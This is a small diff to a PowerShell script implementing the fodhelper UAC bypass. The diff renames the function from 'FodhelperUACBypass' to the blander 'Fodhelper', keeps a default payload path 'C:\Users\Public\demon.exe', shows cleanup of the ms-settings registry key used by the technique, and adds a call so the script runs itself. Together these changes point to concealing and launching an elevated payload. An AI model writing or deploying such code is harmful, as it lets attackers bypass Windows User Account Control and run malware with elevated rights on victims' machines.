@@ -1,4 +1,4 @@
-function FodhelperUACBypass(){ 
+function Fodhelper(){ 
  Param (
            
         [String]$program = "C:\Users\Public\demon.exe" 
@@ -17,3 +17,5 @@ function FodhelperUACBypass(){
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 　
 }
+
+Fodhelper
